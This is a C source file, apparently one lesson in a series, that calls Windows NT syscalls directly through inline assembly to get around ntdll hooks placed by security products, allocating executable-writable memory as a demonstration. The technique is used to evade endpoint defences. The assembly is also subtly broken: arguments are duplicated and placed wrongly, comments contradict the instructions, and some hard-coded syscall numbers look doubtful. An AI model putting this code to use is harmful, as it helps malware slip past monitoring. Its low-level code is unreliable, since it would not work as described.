#include <Windows.h>
#include <stdio.h>

// Windows 10 22H2 x64 syscall numbers
#define SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY 0x18
#define SYSCALL_NT_PROTECT_VIRTUAL_MEMORY 0x50
#define SYSCALL_NT_CREATE_THREAD_EX 0xC2
#define SYSCALL_NT_QUEUE_APC_THREAD_EX 0xBD
#define SYSCALL_NT_DELAY_EXECUTION 0x4B

// Direct syscall stub (pure assembly)
__attribute__((naked))
NTSTATUS
SyscallInvoke(DWORD syscallNumber, ...)
{
    __asm__ volatile(
        "mov r10, rcx\n\t" // Save syscall number
        "mov eax, edx\n\t" // Syscall number in EAX
        "syscall\n\t"      // Execute syscall
        "ret\n\t"          // Return
    );
}

// NtAllocateVirtualMemory wrapper
NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    // Syscall number in EDX, parameters in RCX, R8, R9, stack
    __asm__ volatile(
        "mov r10, %1\n\t" // ProcessHandle
        "mov r8, %2\n\t"  // ZeroBits
        "mov r9, %3\n\t"  // RegionSize
        "sub rsp, 32\n\t" // Shadow space
        "push %4\n\t"     // AllocationType
        "push %5\n\t"     // Protect
        "push %6\n\t"     // BaseAddress
        "push %7\n\t"     // ProcessHandle
        "mov eax, %8\n\t" // Syscall number
        "syscall\n\t"
        "add rsp, 64\n\t" // Clean stack
        :
        : "r"(ProcessHandle), "r"(ProcessHandle), "r"(ZeroBits),
          "r"(RegionSize), "r"(AllocationType), "r"(Protect),
          "r"(BaseAddress), "r"(ProcessHandle),
          "i"(SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY)
        : "r10", "memory");

    // Return status is in EAX
    NTSTATUS status;
    __asm__ volatile("mov %0, eax" : "=r"(status));
    return status;
}

int main()
{
    printf("[ Direct Syscall - x64 ]\n");
    printf("[*] Windows 10 22H2 syscall numbers\n\n");

    // Allocate memory via direct syscall (no ntdll!)
    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;

    printf("[*] Calling NtAllocateVirtualMemory via direct syscall...\n");

    NTSTATUS status = NtAllocateVirtualMemory_Direct(
        GetCurrentProcess(),
        &baseAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: Memory allocated at: %p\n", baseAddr);
        printf("[+] Bypassed: ntdll!NtAllocateVirtualMemory hooks\n");
        printf("[+] Syscall number: 0x%02x\n", SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY);

        // Cleanup
        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }
    else
    {
        printf("[-] Failed: 0x%08lx\n", status);
    }

    return 0;
}

// x86_64-w64-mingw32-gcc -o 01_direct_syscall.exe 01_direct_syscall.c -masm=intel
